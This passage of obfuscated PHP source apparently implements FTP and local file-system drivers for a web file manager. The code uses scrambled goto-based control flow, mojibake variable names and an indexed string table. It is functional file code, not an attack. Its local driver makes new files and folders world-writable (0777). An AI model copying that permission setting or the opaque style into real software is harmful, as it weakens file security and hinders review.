Exception(LNG($dŠ…â±Ë„ä[1244])); } $this->config = $d¦ºªÎÛ±§; $this->charsetReset($d¦ºªÎÛ±§); foreach ($d¦ºªÎÛ±§ as $fí…åÑˆ“ => $e…”ˆìèêØ) { if (isset($this->{$fí…åÑˆ“})) { $this->{$fí…åÑˆ“} = $e…”ˆìèêØ; } } return $this->_login($d¦ºªÎÛ±§); } private function _login($bÓôšÏçò´) { goto cöÊ‡¨ä§‡; böÛƒ÷µ‚›: if (isset($aÉ‘ß²¾¯®[$dƒ‹ÅĞôÕ])) { foreach ($aÉ‘ß²¾¯®[$dƒ‹ÅĞôÕ] as $C¼çøÆÁ± => $DŠøë¸Ãˆæ) { $this->{$C¼çøÆÁ±} = $DŠøë¸Ãˆæ; } return !0; } $cù‹ö¦–İ™ = parse_url(trim($this->server, $F±ã‹¬èˆš[18])); $this->host = $cù‹ö¦–İ™[$F±ã‹¬èˆš[185]]; goto A–²³Û¹Å‘; cöÊ‡¨ä§‡: $F±ã‹¬èˆš =& $_SERVER[£¶ä½¶¢]; static $aÉ‘ß²¾¯® = array(); $dƒ‹ÅĞôÕ = md5(json_encode($bÓôšÏçò´)); goto böÛƒ÷µ‚›; E“­ôäà²¾: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $b‰“ø¡åŠƒ = $this->pasv == $F±ã‹¬èˆš[97] ? !0 : !1; @ftp_pasv($this->connect, $b‰“ø¡åŠƒ); goto fÜ‘Ğ¡ƒ®š; fõÜ©˜äòù: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $e²”É¦‚ó = @ftp_login($this->connect, $this->username, $this->userpass); goto E“­ôäà²¾; fÜ‘Ğ¡ƒ®š: $aÉ‘ß²¾¯®[$dƒ‹ÅĞôÕ] = array($F±ã‹¬èˆš[1248] => $this->connect, $F±ã‹¬èˆš[185] => $this->host, $F±ã‹¬èˆš[184] => $this->scheme, $F±ã‹¬èˆš[186] => $this->port); return $e²”É¦‚ó; goto fŒ©Ùèò£°; A–²³Û¹Å‘: $e™òƒâ§¤ = isset($cù‹ö¦–İ™[$F±ã‹¬èˆš[184]]) && $cù‹ö¦–İ™[$F±ã‹¬èˆš[184]] == $F±ã‹¬èˆš[1245] ? !0 : !1; $this->scheme = $e™òƒâ§¤ ? $F±ã‹¬èˆš[1246] : $F±ã‹¬èˆš[1247]; $this->port = isset($cù‹ö¦–İ™[$F±ã‹¬èˆš[186]]) ? $cù‹ö¦–İ™[$F±ã‹¬èˆš[186]] : 21; goto fõÜ©˜äòù; fŒ©Ùèò£°: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($d±ÆˆŒÜëÁ, $A­ÑÀŞµ†  = '', $cº‚Ñ¨Éˆá = REPEAT_RENAME) { if ($this->setContent($d±ÆˆŒÜëÁ, $A­ÑÀŞµ† )) { return $this->getPathOuter($d±ÆˆŒÜëÁ); } return !1; } public function mkdir($dÔ‘Ñ²—§, $bÈ¿¥Á²¼ô = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $dÔ‘Ñ²—§ = $this->iconvSystem($dÔ‘Ñ²—§); if ($this->_isFolder($dÔ‘Ñ²—§) || @ftp_mkdir($this->connect, $dÔ‘Ñ²—§)) { return $this->getPathOuter($dÔ‘Ñ²—§); } if (!$this->mkdir($this->pathFather($dÔ‘Ñ²—§))) { return !1; } if ($dÔ‘Ñ²—§ = @ftp_mkdir($this->connect, $dÔ‘Ñ²—§)) { return $this->getPathOuter($dÔ‘Ñ²—§); } return !1; } public function copyFile($Eã¿¼ïç, $EÃËÉ÷‡Ÿ°) { goto e¬˜”ˆ·¹—; bµ¬Çâ·›«: $this->tempFileRemve($Eˆæñ­Óµ); return $A¿ÂÉ‹µ­; goto bŒöÈöæ; e¬˜”ˆ·¹—: if (!$this->_isconn()) { return !1; } $F´ÙªïÏòù = $this->pathThis($this->iconvSystem($Eã¿¼ïç)); $Eˆæñ­Óµ = $this->tempFile($F´ÙªïÏòù); goto f¨—õÊ¾Ûó; f¨—õÊ¾Ûó: $C¬ŠÎÁæ = $this->iconvApp($Eˆæñ­Óµ); $this->download($Eã¿¼ïç, $C¬ŠÎÁæ); $A¿ÂÉ‹µ­ = $this->upload($EÃËÉ÷‡Ÿ°, $C¬ŠÎÁæ); goto bµ¬Çâ·›«; bŒöÈöæ: } public function moveFile($aŠ­ÀÀŸÑ°, $Dğ¸²óÖáÈ) { if (!$this->_isconn()) { return !1; } $aŠ­ÀÀŸÑ° = $this->iconvSystem($aŠ­ÀÀŸÑ°); $Dğ¸²óÖáÈ = $this->iconvSystem($Dğ¸²óÖáÈ); $b£ƒÍÕåÅó = @ftp_rename($this->connect, $aŠ­ÀÀŸÑ°, $Dğ¸²óÖáÈ); return $b£ƒÍÕåÅó ? $this->getPathOuter($Dğ¸²óÖáÈ) : !1; } public function delFile($b“Ÿ»ˆ¿óÈ) { if (!$this->_isconn()) { return !1; } $b“Ÿ»ˆ¿óÈ = $this->iconvSystem($b“Ÿ»ˆ¿óÈ); return @ftp_delete($this->connect, $b“Ÿ»ˆ¿óÈ); } public function delFolder($E±ì¼±®•) { goto cğ—Î¶á—¾; c„ˆ§‡Í¨: $this->fileList($E±ì¼±®•, $bªƒµØ¦Ÿ­, $E®ÇÖçëô, !0); $this->listItemCache = !0; foreach ($E®ÇÖçëô as $A¯Ñã·Â¯») { $BÓ—´Äß¶‰ = $this->iconvSystem($A¯Ñã·Â¯»[$_SERVER[£¶ä½¶¢][38]]); $FåãËáğ¢ = @ftp_delete($this->connect, $BÓ—´Äß¶‰); if (!$FåãËáğ¢) { return !1; } } goto eš½˜ò„‹ƒ; eš½˜ò„‹ƒ: foreach ($bªƒµØ¦Ÿ­ as $BÓ—´Äß¶‰) { $BÓ—´Äß¶‰ = $this->iconvSystem($BÓ—´Äß¶‰); $FåãËáğ¢ = @ftp_rmdir($this->connect, $BÓ—´Äß¶‰); if (!$FåãËáğ¢) { return !1; } } $E±ì¼±®• = $this->iconvSystem($E±ì¼±®•); return @ftp_rmdir($this->connect, $E±ì¼±®•); goto FÛ†ôø¥Š; cğ—Î¶á—¾: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $bªƒµØ¦Ÿ­ = $E®ÇÖçëô = array(); goto c„ˆ§‡Í¨; FÛ†ôø¥Š: } public function rename($a¡›ÀõÇ…, $AäÍ«„¹¹õ) { goto FĞƒÃáôÉÊ; FĞƒÃáôÉÊ: $DÃÃ Ñ¢¶Ê =& $_SERVER[£¶ä½¶¢]; if (!$this->_isconn()) { return !1; } $fºÏ”Ñğê = $this->fileNameAuto($this->pathFather($a¡›ÀõÇ…), $AäÍ«„¹¹õ); goto fï‚èÁŠÌÉ; e ’²±İÓ¶: $f“å”µ¤ŠÄ = rtrim($Bˆ¯ÜĞÄ, $DÃÃ Ñ¢¶Ê[18]) . $DÃÃ Ñ¢¶Ê[18] . $fºÏ”Ñğê; $d†‘®ÍïÊß = @ftp_rename($this->connect, $a¡›ÀõÇ…, $f“å”µ¤ŠÄ); $f“å”µ¤ŠÄ = $this->iconvApp($f“å”µ¤ŠÄ); goto B÷»¿ˆôÑ¨; fï‚èÁŠÌÉ: $fºÏ”Ñğê = $this->iconvSystem($fºÏ”Ñğê); $a¡›ÀõÇ… = $this->iconvSystem($a¡›ÀõÇ…); $Bˆ¯ÜĞÄ = $this->pathFather($a¡›ÀõÇ…); goto e ’²±İÓ¶; B÷»¿ˆôÑ¨: return $d†‘®ÍïÊß ? $this->getPathOuter($f“å”µ¤ŠÄ) : !1; goto B¸“©œ¡ÇŒ; B¸“©œ¡ÇŒ: } private function folderInfo($cšÛ¥¡ÂŒ‹, $B¸å¡¨¡™ = false) { $dÃÃ÷†‚ÂÓ =& $_SERVER[£¶ä½¶¢]; $fºÎğÚµÈ± = array($dÃÃ÷†‚ÂÓ[38] => $this->pathThis($cšÛ¥¡ÂŒ‹), $dÃÃ÷†‚ÂÓ[86] => $this->getPathOuter($dÃÃ÷†‚ÂÓ[18] . $cšÛ¥¡ÂŒ‹), $dÃÃ÷†‚ÂÓ[39] => $dÃÃ÷†‚ÂÓ[87]); if ($B¸å¡¨¡™) { return $fºÎğÚµÈ±; } $fºÎğÚµÈ±[$dÃÃ÷†‚ÂÓ[204]] = $fºÎğÚµÈ±[$dÃÃ÷†‚ÂÓ[94]] = 0; $fºÎğÚµÈ±[$dÃÃ÷†‚ÂÓ[205]] = $fºÎğÚµÈ±[$dÃÃ÷†‚ÂÓ[206]] = !0; return $fºÎğÚµÈ±; } private function fileInfo($AØ¹‹¦ƒ¥³, $fŒÖ»îª¦ß = false, $b†Šã‘‚®Á = array()) { goto f¾‰©ŞêÏª; aï·Ä©Ø¾¯: $AÌ˜Ö[$a½•â‚—ø[204]] = $AÌ˜Ö[$a½•â‚—ø[94]] = 0; $AÌ˜Ö[$a½•â‚—ø[205]] = $AÌ˜Ö[$a½•â‚—ø[206]] = !0; $dŸ³¥ Ò…Š = $this->iconvSystem($AØ¹‹¦ƒ¥³); goto a¦÷ŠØĞò; a¦÷ŠØĞò: $AÌ˜Ö[$a½•â‚—ø[94]] = @ftp_mdtm($this->connect, $dŸ³¥ Ò…Š); if (empty($b†Šã‘‚®Á)) { $b†Šã‘‚®Á = $this->objectMeta($AØ¹‹¦ƒ¥³); if (!$b†Šã‘‚®Á) { return $AÌ˜Ö; } } $AÌ˜Ö[$a½•â‚—ø[88]] = $b†Šã‘‚®Á[$a½•â‚—ø[88]]; goto Eİ‹É÷Î‚; f¾‰©ŞêÏª: $a½•â‚—ø =& $_SERVER[£¶ä½¶¢]; $AÌ˜Ö = array($a½•â‚—ø[38] => $this->pathThis($AØ¹‹¦ƒ¥³), $a½•â‚—ø[86] => $this->getPathOuter($a½•â‚—ø[18] . $AØ¹‹¦ƒ¥³), $a½•â‚—ø[39] => $a½•â‚—ø[203], $a½•â‚—ø[88] => isset($b†Šã‘‚®Á[$a½•â‚—ø[88]]) ? $b†Šã‘‚®Á[$a½•â‚—ø[88]] : 0, $a½•â‚—ø[178] => $this->ext($AØ¹‹¦ƒ¥³)); if ($fŒÖ»îª¦ß) { return $AÌ˜Ö; } goto aï·Ä©Ø¾¯; Eİ‹É÷Î‚: return $AÌ˜Ö; goto CíàÅåÍ–; CíàÅåÍ–: } public function size($D¸’§±øÎõ) { $D³Û„ŒÔÏ = $this->objectMeta($D¸’§±øÎõ); return $D³Û„ŒÔÏ ? $D³Û„ŒÔÏ[$_SERVER[£¶ä½¶¢][88]] : 0; } public function info($D¹Ü¼®óƒò) { if ($this->isFile($D¹Ü¼®óƒò)) { return $this->fileInfo($D¹Ü¼®óƒò, 0); } else { if ($this->isFolder($D¹Ü¼®óƒò)) { return $this->folderInfo($D¹Ü¼®óƒò); } } return !1; } private function fileList($fÓõˆÄ·Ó¹, &$fÅéîÏìí§, &$fÒ…ˆ±·®‘, $F˜ğ’ÃĞ·˜ = false) { goto bÌïßÊê‹; dŒí¢§ô•: @ftp_chdir($this->connect, $cò¾·ÕĞä²[18]); $fÓõˆÄ·Ó¹ = rtrim($fÓõˆÄ·Ó¹, $cò¾·ÕĞä²[18]) . $cò¾·ÕĞä²[18]; check_abort(); goto d–Ø¯‚¤µ; Eˆ¤½ªßê¯: $FÔ¯Ö„—‘§ = array($cò¾·ÕĞä²[105] => 1, $cò¾·ÕĞä²[1249] => 1); foreach ($Dì„‰Ò¾­ as $aÀ…•”åÊÃ) { goto CğÙä„Â; CğÙä„Â: $BÇÓÌ©æ¢„ = $this->_listItem($aÀ…•”åÊÃ); if ($BÇÓÌ©æ¢„[0] == $cò¾·ÕĞä²[727]) { continue; } $dõ´Ù…˜®î = $BÇÓÌ©æ¢„[8]; goto eš‘Şò©ø§; D†÷¿óÊãÖ: if (substr($aÀ…•”åÊÃ, 0, 1) == $cò¾·ÕĞä²[1250]) { $b˜Ø…ù¥ä[$cò¾·ÕĞä²[39]] = $cò¾·ÕĞä²[87]; $b˜Ø…ù¥ä[$cò¾·ÕĞä²[88]] = 0; } $E¶«¹®°«è = $b˜Ø…ù¥ä[$cò¾·ÕĞä²[39]] == $cò¾·ÕĞä²[87] ? !0 : !1; if ($bÀ©í÷¢´…) { $this->cacheMethod($cò¾·ÕĞä²[209], $dõ´Ù…˜®î, $E¶«¹®°«è); $this->cacheMethod($cò¾·ÕĞä²[210], $dõ´Ù…˜®î, $b˜Ø…ù¥ä); } goto bÒØˆëƒÎ¯; bÒØˆëƒÎ¯: if ($E¶«¹®°«è) { $fÅéîÏìí§[] = $dõ´Ù…˜®î; if ($F˜ğ’ÃĞ·˜) { $this->fileList($dõ´Ù…˜®î, $fÅéîÏìí§, $fÒ…ˆ±·®‘, $F˜ğ’ÃĞ·˜); } continue; } $fÒ…ˆ±·®‘[] = $b˜Ø…ù¥ä; goto cÊ–¿î¦Ó; eš‘Şò©ø§: if (empty($dõ´Ù…˜®î) && $dõ´Ù…˜®î !== $cò¾·ÕĞä²[201] || isset($FÔ¯Ö„—‘§[$dõ´Ù…˜®î])) { continue; } $dõ´Ù…˜®î = $this->iconvApp($fÓõˆÄ·Ó¹ . ltrim($dõ´Ù…˜®î, $cò¾·ÕĞä²[18])); $b˜Ø…ù¥ä = array($cò¾·ÕĞä²[38] => $dõ´Ù…˜®î, $cò¾·ÕĞä²[39] => $cò¾·ÕĞä²[203], $cò¾·ÕĞä²[88] => $BÇÓÌ©æ¢„[4]); goto D†÷¿óÊãÖ; cÊ–¿î¦Ó: } if ($bÀ©í÷¢´…) { $this->cacheMethod($cò¾·ÕĞä²[209], $fÓõˆÄ·Ó¹, !0); } goto e±Ş£ò¯ÚÉ; bÌïßÊê‹: $cò¾·ÕĞä² =& $_SERVER[£¶ä½¶¢]; $fÓõˆÄ·Ó¹ = $this->iconvSystem($fÓõˆÄ·Ó¹); if (!$this->isFolder($fÓõˆÄ·Ó¹)) { return !1; } goto dŒí¢§ô•; d–Ø¯‚¤µ: $bÀ©í÷¢´… = $this->listItemCache === !1 ? !1 : !0; $Dì„‰Ò¾­ = @ftp_rawlist($this->connect, $fÓõˆÄ·Ó¹); if (!$Dì„‰Ò¾­) { $Dì„‰Ò¾­ = array(); } goto Eˆ¤½ªßê¯; e±Ş£ò¯ÚÉ: } private function _listItem($c“…ÌÛÊÓ) { if (empty($c“…ÌÛÊÓ)) { return array(); } $D†®–á‚éê = preg_split($_SERVER[£¶ä½¶¢][1251], $c“…ÌÛÊÓ); if (count($D†®–á‚éê) <= 9) { return $D†®–á‚éê; } $D†®–á‚éê[8] = trim(substr($c“…ÌÛÊÓ, strpos($c“…ÌÛÊÓ, $D†®–á‚éê[7]) + strlen($D†®–á‚éê[7]))); return array_splice($D†®–á‚éê, 0, 9); } public function listPath($e“à¹Ğ‡¯, $EÛ‡¯ùóâ = false) { goto fØ­™¢½ç; fØ­™¢½ç: $AÉ¼Ü¼”Ê‰ =& $_SERVER[£¶ä½¶¢]; if (!$this->_isconn()) { return !1; } $dÕÑ…‡¼¾Ú = $DÇ¹Ã¢ŒİÄ = array(); goto A„ì‚â×ò; fÈ„Éï®³: return array($AÉ¼Ü¼”Ê‰[85] => $dÕÑ…‡¼¾Ú, $AÉ¼Ü¼”Ê‰[84] => $DÇ¹Ã¢ŒİÄ); goto BŒŞ¢ÒŠ×›; A„ì‚â×ò: $this->fileList($e“à¹Ğ‡¯, $dÕÑ…‡¼¾Ú, $DÇ¹Ã¢ŒİÄ); foreach ($dÕÑ…‡¼¾Ú as $CÅà˜–Ò‹Ç => $B–ñ»£·×») { $dÕÑ…‡¼¾Ú[$CÅà˜–Ò‹Ç] = $this->folderInfo($B–ñ»£·×», $EÛ‡¯ùóâ); } foreach ($DÇ¹Ã¢ŒİÄ as $CÅà˜–Ò‹Ç => $B–ñ»£·×») { $DÇ¹Ã¢ŒİÄ[$CÅà˜–Ò‹Ç] = $this->fileInfo($B–ñ»£·×»[$AÉ¼Ü¼”Ê‰[38]], $EÛ‡¯ùóâ, $B–ñ»£·×»); } goto fÈ„Éï®³; BŒŞ¢ÒŠ×›: } public function has($cö… ×¤š, $DÖ…²áæÎœ = false, $d’Ğê‡šá‡ = true) { goto BËóÀê ³è; C·õ´”’£í: return !1; goto A¹¨†…·Õ; fî²º…Òå¾: $this->fileList($cö… ×¤š, $dáÀµÎ¸‹É, $E¹Ü¨ˆÌ»ç, $A»ƒÏ¤˜ˆ); if ($DÖ…²áæÎœ) { return array($F©å¥Ù[213] => count($E¹Ü¨ˆÌ»ç), $F©å¥Ù[214] => count($dáÀµÎ¸‹É)); } if ($d’Ğê‡šá‡) { if (count($E¹Ü¨ˆÌ»ç)) { return !0; } } else { if (count($dáÀµÎ¸‹É)) { return !0; } } goto C·õ´”’£í; BËóÀê ³è: $F©å¥Ù =& $_SERVER[£¶ä½¶¢]; $dáÀµÎ¸‹É = $E¹Ü¨ˆÌ»ç = array(); $A»ƒÏ¤˜ˆ = $DÖ…²áæÎœ ? !0 : !1; goto fî²º…Òå¾; A¹¨†…·Õ: } public function listAll($cİ¿¯çæŠé) { goto F»Îî¾÷öË; EĞñã“Œ±Ä: $this->fileList($cİ¿¯çæŠé, $Fø–ß¢ÚÜ‡, $f‹âöæ»­, !0); $f´Ø‡Ø³” = array(); foreach ($f‹âöæ»­ as $D«®‚Ó†ë˜) { $f´Ø‡Ø³”[$D«®‚Ó†ë˜[$DÇ¢§Ù˜’[38]]] = $D«®‚Ó†ë˜[$DÇ¢§Ù˜’[88]]; } goto cÖ‰‹Šôë®; cÖ‰‹Šôë®: foreach ($Fø–ß¢ÚÜ‡ as $D«®‚Ó†ë˜) { if (is_string($D«®‚Ó†ë˜)) { $f´Ø‡Ø³”[$D«®‚Ó†ë˜] = 0; } } return $this->listAllFiles($cİ¿¯çæŠé, array_keys($f´Ø‡Ø³”), $f´Ø‡Ø³”); goto bí†ëÜŒ´; F»Îî¾÷öË: $DÇ¢§Ù˜’ =& $_SERVER[£¶ä½¶¢]; if (!$this->_isconn()) { return !1; } $Fø–ß¢ÚÜ‡ = $f‹âöæ»­ = array(); goto EĞñã“Œ±Ä; bí†ëÜŒ´: } public function getContent($fô¤Ù±¼ÈÜ) { if (!$this->_isconn()) { return !1; } $fô¤Ù±¼ÈÜ = $this->iconvSystem($fô¤Ù±¼ÈÜ); return $this->fileSubstr($fô¤Ù±¼ÈÜ); } public function setContent($bç‚¥ì‘ó©, $EÅˆèç³Âç = '') { goto d†›¹Õ‹«¿; aÛØ“¾‰¼: file_put_contents($Cî—åÒ½Ó, $EÅˆèç³Âç); $c’Ô‰Ä­Ã¿ = $this->upload($bç‚¥ì‘ó©, $this->iconvApp($Cî—åÒ½Ó)); $this->tempFileRemve($Cî—åÒ½Ó); goto e‰ˆ«áö; d†›¹Õ‹«¿: if (!$this->_isconn()) { return !1; } $dó­æÅ‹Ó” = $this->pathThis($this->iconvSystem($bç‚¥ì‘ó©)); $Cî—åÒ½Ó = $this->tempFile($dó­æÅ‹Ó”); goto aÛØ“¾‰¼; e‰ˆ«áö: return $c’Ô‰Ä­Ã¿; goto b³›“‘ÇÚĞ; b³›“‘ÇÚĞ: } public function fileSubstr($e‰È–ÚÄ“ö, $F¸‚¿¯Çƒ¸ = 0, $E—îÂ–‰ˆ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($e‰È–ÚÄ“ö, $F¸‚¿¯Çƒ¸, $E—îÂ–‰ˆ); } private function ftpRequest($C›å„ƒ÷ø», $b·ŠŸÌ‹Ó˜ = 0, $Aö¾‰†Üƒ¡ = false) { goto dâÃ¹×¤“‚; F™ô¾à¼­È: curl_setopt($f½°®Á¨«, CURLOPT_RETURNTRANSFER, 1); $c¸¢­‡•¥‹ = curl_exec($f½°®Á¨«); curl_close($f½°®Á¨«); goto dˆ“Ñ¾½ø; dâÃ¹×¤“‚: $C›å„ƒ÷ø» = $this->iconvSystem($C›å„ƒ÷ø»); $aËîİËÁ­Ñ = $this->scheme . $this->host . $_SERVER[£¶ä½¶¢][14] . $this->port; $f½°®Á¨« = curl_init(); goto AÂ„¬šùÑÏ; dˆ“Ñ¾½ø: return $c¸¢­‡•¥‹; goto A«ÈÆÂ¼×¤; AÂ„¬šùÑÏ: curl_setopt($f½°®Á¨«, CURLOPT_URL, $aËîİËÁ­Ñ . $this->pathEncode($C›å„ƒ÷ø»)); curl_setopt($f½°®Á¨«, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Aö¾‰†Üƒ¡) { $eÊäÙ“Âø = $b·ŠŸÌ‹Ó˜ + $Aö¾‰†Üƒ¡ - 1; curl_setopt($f½°®Á¨«, CURLOPT_RANGE, "{$b·ŠŸÌ‹Ó˜}\55{$eÊäÙ“Âø}"); } goto F™ô¾à¼­È; A«ÈÆÂ¼×¤: } public function upload($Aàíëƒ’, $B’ÙïÕæË, $E¸éã÷°¤Á = false, $fÈ†ø›áø = REPEAT_REPLACE) { goto Cİãˆ«îã“; D‡êÛÈ: $B’ÙïÕæË = $this->iconvSystem($B’ÙïÕæË); $Eã”½³ğÃã = ftp_nb_put($this->connect, $Aàíëƒ’, $B’ÙïÕæË, FTP_BINARY); while ($Eã”½³ğÃã == FTP_MOREDATA) { $Eã”½³ğÃã = ftp_nb_continue($this->connect); } goto Dõ÷‹ËåÓ; Cİãˆ«îã“: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Aàíëƒ’))) { return !1; } $Aàíëƒ’ = $this->iconvSystem($Aàíëƒ’); goto D‡êÛÈ; Dõ÷‹ËåÓ: if ($Eã”½³ğÃã != FTP_FINISHED) { return !1; } return $this->getPathOuter($Aàíëƒ’); goto eçÛ”¥èªô; eçÛ”¥èªô: } public function download($c±¹œ†íä·, $E†ÉÅËëğ· = '') { goto FøÌÕ¥™œ›; fÙŞëå±Ò°: while ($CÒªÒæƒ‡ == FTP_MOREDATA) { $CÒªÒæƒ‡ = ftp_nb_continue($this->connect); } if ($CÒªÒæƒ‡ != FTP_FINISHED) { return !1; } return $this->iconvApp($E†ÉÅËëğ·); goto FøßÉÁïŠÑ; FøÌÕ¥™œ›: if (!$this->_isconn()) { return !1; } $ešæ’’¬Óã = $this->pathFather($E†ÉÅËëğ·); if (!IO::mkdir($ešæ’’¬Óã)) { return !1; } goto b¿Ôç«ŒÎ; b¿Ôç«ŒÎ: $c±¹œ†íä· = $this->iconvSystem($c±¹œ†íä·); $E†ÉÅËëğ· = $this->iconvSystem($E†ÉÅËëğ·); $CÒªÒæƒ‡ = ftp_nb_get($this->connect, $E†ÉÅËëğ·, $c±¹œ†íä·, FTP_BINARY); goto fÙŞëå±Ò°; FøßÉÁïŠÑ: } public function exist($A é÷çˆïŠ) { return $this->isFile($A é÷çˆïŠ) || $this->isFolder($A é÷çˆïŠ); } public function isFile($eœà›¬Šã) { return !$this->isFolder($eœà›¬Šã) && $this->objectMeta($eœà›¬Šã); } public function isFolder($BÌ†òŞ‹æ) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][209], $BÌ†òŞ‹æ); } protected function objectMeta($a‘Í‹°Û¼) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][210], $a‘Í‹°Û¼); } protected function _objectMeta($aŞÕšä­÷ê) { goto b²©…ä‰‹“; b²©…ä‰‹“: $FõÀˆÈ¹ë— =& $_SERVER[£¶ä½¶¢]; if ($aŞÕšä­÷ê == $FõÀˆÈ¹ë—[43] || $aŞÕšä­÷ê == $FõÀˆÈ¹ë—[18]) { return array(); } if (!$this->_isconn()) { return !1; } goto d×ß‡ª½ë‡; DÅšÙÈé²Ü: $EÜæÓŞ³™ = @ftp_size($this->connect, $aŞÕšä­÷ê); if ($EÜæÓŞ³™ != -1) { $Cñ‡ÙÈé¨À[$FõÀˆÈ¹ë—[88]] = $EÜæÓŞ³™; } else { $C‚Í¡‹§™» = @ftp_chdir($this->connect, $aŞÕšä­÷ê); if (!$C‚Í¡‹§™») { return !1; } $Cñ‡ÙÈé¨À[$FõÀˆÈ¹ë—[39]] = $FõÀˆÈ¹ë—[87]; } return $Cñ‡ÙÈé¨À; goto E©ƒğ±“Ç; d×ß‡ª½ë‡: $aŞÕšä­÷ê = $this->iconvSystem($aŞÕšä­÷ê); $Cñ‡ÙÈé¨À = array($FõÀˆÈ¹ë—[38] => $this->iconvApp($aŞÕšä­÷ê), $FõÀˆÈ¹ë—[39] => $FõÀˆÈ¹ë—[203], $FõÀˆÈ¹ë—[88] => 0); @ftp_chdir($this->connect, $FõÀˆÈ¹ë—[18]); goto DÅšÙÈé²Ü; E©ƒğ±“Ç: } protected function _isFolder($fÅ©”óÄàò) { $F¦®ÊìØˆ =& $_SERVER[£¶ä½¶¢]; if ($fÅ©”óÄàò == $F¦®ÊìØˆ[43] || $fÅ©”óÄàò == $F¦®ÊìØˆ[18]) { return !0; } $eÏé’í÷¯ = $this->_objectMeta($fÅ©”óÄàò); return isset($eÏé’í÷¯[$F¦®ÊìØˆ[39]]) && $eÏé’í÷¯[$F¦®ÊìØˆ[39]] == $F¦®ÊìØˆ[87] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($cÎš…ÂÖ£) { if (substr($cÎš…ÂÖ£, 0, 2) == $_SERVER[£¶ä½¶¢][1242]) { $cÎš…ÂÖ£ = BASIC_PATH . substr($cÎš…ÂÖ£, 2); } return $cÎš…ÂÖ£; } public function iconvApp($E¬°ØÁ”„) { $Eßªö¥½Œé =& $_SERVER[£¶ä½¶¢]; global $config; return $this->iconvTo($E¬°ØÁ”„, $config[$Eßªö¥½Œé[1240]], $config[$Eßªö¥½Œé[1239]]); } public function iconvSystem($eáÚ•”·‰ø) { $BÃ®Ñ½¹Ü£ =& $_SERVER[£¶ä½¶¢]; global $config; return $this->iconvTo($eáÚ•”·‰ø, $config[$BÃ®Ñ½¹Ü£[1239]], $config[$BÃ®Ñ½¹Ü£[1240]]); } public function getPathOuter($f‡ËÛ‘ÏÏÀ) { goto C¦£·¥Œ; e°Ñá²¢‹: if (substr($e¿ÆÆ°¥¬, 0, 2) == $Còˆ¿µàïÕ[1242]) { $e¿ÆÆ°¥¬ = BASIC_PATH . substr($e¿ÆÆ°¥¬, 2); } if (substr($f‡ËÛ‘ÏÏÀ, 0, 2) == $Còˆ¿µàïÕ[1242]) { $f‡ËÛ‘ÏÏÀ = BASIC_PATH . substr($f‡ËÛ‘ÏÏÀ, 2); } $e¿ÆÆ°¥¬ = KodIO::clear($e¿ÆÆ°¥¬); goto EÀÄ•Ê˜; EÀÄ•Ê˜: $f‡ËÛ‘ÏÏÀ = KodIO::clear($f‡ËÛ‘ÏÏÀ); $f‡ËÛ‘ÏÏÀ = substr($f‡ËÛ‘ÏÏÀ, strlen($e¿ÆÆ°¥¬)); if (empty($this->pathDriver)) { return $f‡ËÛ‘ÏÏÀ; } goto d½ÉÜ«òòõ; C¦£·¥Œ: $Còˆ¿µàïÕ =& $_SERVER[£¶ä½¶¢]; $e¿ÆÆ°¥¬ = $this->iconvApp($this->pathBase); $f‡ËÛ‘ÏÏÀ = $this->iconvApp($f‡ËÛ‘ÏÏÀ); goto e°Ñá²¢‹; d½ÉÜ«òòõ: return $this->pathDriver . $Còˆ¿µàïÕ[18] . ltrim($f‡ËÛ‘ÏÏÀ, $Còˆ¿µàïÕ[18]); goto a”öÆÌ; a”öÆÌ: } public function mkfile($FÔÁ÷›Öâï, $Fê¼¶½ö¶‹ = '', $Bî÷“âŸßÆ = REPEAT_RENAME) { $FÔÁ÷›Öâï = $this->iconvSystem($FÔÁ÷›Öâï); @touch($FÔÁ÷›Öâï); if ($Fê¼¶½ö¶‹) { file_put_contents($FÔÁ÷›Öâï, $Fê¼¶½ö¶‹); } @chmod($FÔÁ÷›Öâï, 511); return is_file($FÔÁ÷›Öâï) ? $this->getPathOuter($FÔÁ÷›Öâï) : !1; } public function mkdir($D¤Æ‘…Üøº, $fôéªÖ§‚œ = REPEAT_SKIP) { $D¤Æ‘…Üøº = $this->iconvSystem($D¤Æ‘…Üøº); if (is_dir($D¤Æ‘…Üøº)) { return $this->getPathOuter($D¤Æ‘…Üøº); } @mkdir($D¤Æ‘…Üøº, 511, !0); @chmod($D¤Æ‘…Üøº, 511); return is_dir($D¤Æ‘…Üøº) ? $this->getPathOuter($D¤Æ‘…Üøº) : !1; } public function copyFile($dƒ¼ñÆÛ§ˆ, $B«³Œ¢£È‰) { $this->mkdir($this->pathFather($B«³Œ¢£È‰)); $dƒ¼ñÆÛ§ˆ = $this->iconvSystem($dƒ¼ñÆÛ§ˆ); $B«³Œ¢£È‰ = $this->iconvSystem($B«³Œ¢£È‰); $FÇˆÇ’Ğö’ = copy_64($dƒ¼ñÆÛ§ˆ, $B«³Œ¢£È‰); @chmod($B«³Œ¢£È‰, 511); return $FÇˆÇ’Ğö’ ? $this->getPathOuter($B«³Œ¢£È‰) : !1; } public function moveFile($a¦˜ÇÄ ‘, $c´¡×¤ÏÖ®) { goto D÷ô˜ö˜; D÷ô˜ö˜: $this->mkdir($this->pathFather($c´¡×¤ÏÖ®)); $a¦˜ÇÄ ‘ = $this->iconvSystem($a¦˜ÇÄ ‘); $c´¡×¤ÏÖ® = $this->iconvSystem($c´¡×¤ÏÖ®); goto eÑ÷‰®ô§¨; eÑ÷‰®ô§¨: $dĞğå”‘ = intval(@rename($a¦˜ÇÄ ‘, $c´¡×¤ÏÖ®)); if (!$dĞğå”‘) { if ($dĞğå”‘ = intval(@copy_64($a¦˜ÇÄ ‘, $c´¡×¤ÏÖ®))) { @unlink($a¦˜ÇÄ ‘); } } @chmod($c´¡×¤ÏÖ®, 511); goto bõÁÊ¢¦ÑÑ; bõÁÊ¢¦ÑÑ: return $dĞğå”‘ ? 